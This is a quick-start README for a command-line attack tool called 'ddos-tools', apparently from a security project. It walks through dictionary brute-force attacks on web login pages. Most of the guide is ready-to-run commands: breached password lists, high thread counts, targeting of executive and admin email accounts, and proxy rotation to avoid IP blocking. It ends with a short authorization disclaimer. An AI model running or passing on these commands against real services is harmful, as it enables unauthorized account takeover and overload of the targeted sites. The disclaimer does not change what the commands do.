# Dictionary Attack Quick Start Guide

This guide will get you started with dictionary-based login attacks in under 5 minutes.

## Step 1: Download Password Dictionaries

Choose a dictionary size based on your needs:

```bash
# Fast testing (500 passwords)
./ddos-tools dict download passwords-500

# Balanced (1,000 passwords) - RECOMMENDED
./ddos-tools dict download passwords-1k

# Comprehensive (10,000 passwords)
./ddos-tools dict download passwords-10k

# Download usernames too
./ddos-tools dict download usernames
```

## Step 2: Verify Downloads

```bash
./ddos-tools dict list
```

You should see output like:
```
[OK] ✓ Passwords (500) (499 entries) - files/passwords-500.txt
[OK] ✓ Passwords (1k) (1049 entries) - files/passwords-1k.txt
[OK] ✓ Passwords (10k) (10000 entries) - files/passwords-10k.txt
[OK] ✓ Usernames (17 entries) - files/usernames.txt
```

## Step 3: Run Your First Attack

### Option A: Quick Test (Password Dictionary Only)

```bash
./ddos-tools LOGIN https://example.com/api/login \
  --passwords files/passwords-1k.txt \
  --threads 50 \
  --duration 60
```

This uses the password dictionary with default usernames (admin, user, root, administrator, test).
**Total combinations**: 5 usernames × 1,049 passwords = 5,245 attempts

### Option B: Full Attack (Username + Password Dictionaries)

```bash
./ddos-tools LOGIN https://example.com/api/login \
  --usernames files/usernames.txt \
  --passwords files/passwords-1k.txt \
  --threads 100 \
  --duration 120
```

**Total combinations**: 17 usernames × 1,049 passwords = 17,833 attempts

### Option C: Pre-Made Credentials File

```bash
./ddos-tools LOGIN https://example.com/admin \
  --data files/example-credentials.txt \
  --threads 50
```

Uses the example credentials file (31 credential pairs).

## Step 4: Create Your Own Credentials

### Custom Username List

Create `my-users.txt`:
```
admin
support
webmaster
backup
```

### Custom Password List

Create `my-passwords.txt`:
```
CompanyName2024
Winter2024!
Welcome123
P@ssw0rd
```

### Use Them Together

```bash
./ddos-tools LOGIN https://target.com/login \
  --usernames my-users.txt \
  --passwords my-passwords.txt \
  --threads 100
```

**Total combinations**: 4 × 4 = 16 attempts

## Understanding Combinations

When using separate username and password files, the tool generates **ALL combinations**:

| Usernames | Passwords | Total Combinations |
|-----------|-----------|-------------------|
| 5 (default) | 500 | 2,500 |
| 5 (default) | 1,000 | 5,000 |
| 17 | 1,000 | 17,000 |
| 17 | 10,000 | 170,000 |
| 100 | 10,000 | 1,000,000 |

💡 **Tip**: Start small and increase dictionary size as needed.

## Advanced Usage

### With Proxies

```bash
./ddos-tools LOGIN https://example.com/login \
  --passwords files/passwords-10k.txt \
  --threads 200 \
  --proxy-file http.txt \
  --rpc 100
```

### Auto-Download Dictionary

If the dictionary doesn't exist, it will be downloaded automatically:

```bash
./ddos-tools LOGIN https://example.com/login \
  --passwords files/passwords-1k.txt \
  --download-dict \
  --threads 100
```

### Targeted Attack

Create `high-value-targets.txt`:
```
ceo@company.com
admin@company.com
support@company.com
```

Use with common passwords:
```bash
./ddos-tools LOGIN https://company.com/portal \
  --usernames high-value-targets.txt \
  --passwords files/passwords-500.txt \
  --threads 50
```

## Performance Tips

1. **Start with small dictionaries** (500-1k passwords)
2. **Use proxies** to distribute load and avoid IP blocking
3. **Monitor combinations**: Remember usernames × passwords = total attempts
4. **Adjust threads** based on target capacity (start with 50-100)
5. **Use RPC wisely**: Higher RPC = more requests per connection

## Common Issues

### "Dictionary not found"
```bash
# Solution: Download it first
./ddos-tools dict download passwords-1k
```

### "Too many combinations"
```bash
# Solution: Use smaller dictionaries or pre-combined credentials file
./ddos-tools LOGIN https://target.com/login --data files/example-credentials.txt
```

### "Connection refused / Too many requests"
```bash
# Solution: Reduce threads and add delays
./ddos-tools LOGIN https://target.com/login \
  --passwords files/passwords-500.txt \
  --threads 25 \
  --rpc 50
```

## Dictionary Sources

All dictionaries are from **SecLists** - the security tester's companion:
- GitHub: https://github.com/danielmiessler/SecLists
- License: MIT
- Content: Real-world password lists from data breaches

### What's Inside?

**passwords-500.txt**: Top 500 worst/most common passwords
- password, 123456, 12345678, qwerty, abc123, etc.

**passwords-1k.txt**: Best 1,050 passwords
- Optimized list of most effective passwords for testing

**passwords-10k.txt**: Top 10,000 most common passwords
- Comprehensive list from millions of breached passwords

**usernames.txt**: Common system and service usernames
- root, admin, test, guest, oracle, mysql, etc.

## Example Workflow

```bash
# 1. Download dictionaries
./ddos-tools dict download passwords-1k
./ddos-tools dict download usernames

# 2. Check what was downloaded
./ddos-tools dict list

# 3. Run a test attack (1 minute)
./ddos-tools LOGIN https://testsite.com/login \
  --passwords files/passwords-1k.txt \
  --threads 50 \
  --duration 60

# 4. If successful, scale up
./ddos-tools dict download passwords-10k

./ddos-tools LOGIN https://testsite.com/login \
  --usernames files/usernames.txt \
  --passwords files/passwords-10k.txt \
  --threads 200 \
  --duration 300 \
  --proxy-file socks5.txt
```

## Legal & Ethical Notice

⚠️ **CRITICAL WARNING**

- **Only test systems you own** or have **written authorization** to test
- Unauthorized access attempts are **illegal** in most jurisdictions
- This tool is for **educational and authorized security testing only**
- Violating computer access laws can result in severe penalties
- Always follow **responsible disclosure** practices

## Configuration File

Dictionary providers are configured in `config.json`, similar to proxy providers. This allows:
- Easy URL updates without code changes
- Adding custom dictionary sources
- Centralized configuration management
- Consistent with the project's architecture

To view configured dictionaries, see the `dictionary-providers` section in `config.json`.

## Need Help?

Run `./ddos-tools help` for full command reference.

For detailed documentation, see [DICTIONARY_ATTACK.md](docs/DICTIONARY_ATTACK.md)

## Quick Reference

```bash
# Download dictionaries
./ddos-tools dict download passwords-500    # Fastest
./ddos-tools dict download passwords-1k     # Recommended
./ddos-tools dict download passwords-10k    # Comprehensive
./ddos-tools dict download usernames        # Common usernames

# List downloaded dictionaries
./ddos-tools dict list

# Basic login attack
./ddos-tools LOGIN <target> --passwords files/passwords-1k.txt

# Advanced login attack
./ddos-tools LOGIN <target> \
  --usernames files/usernames.txt \
  --passwords files/passwords-10k.txt \
  --threads 200 \
  --proxy-file http.txt
```

Happy (ethical) testing! 🔐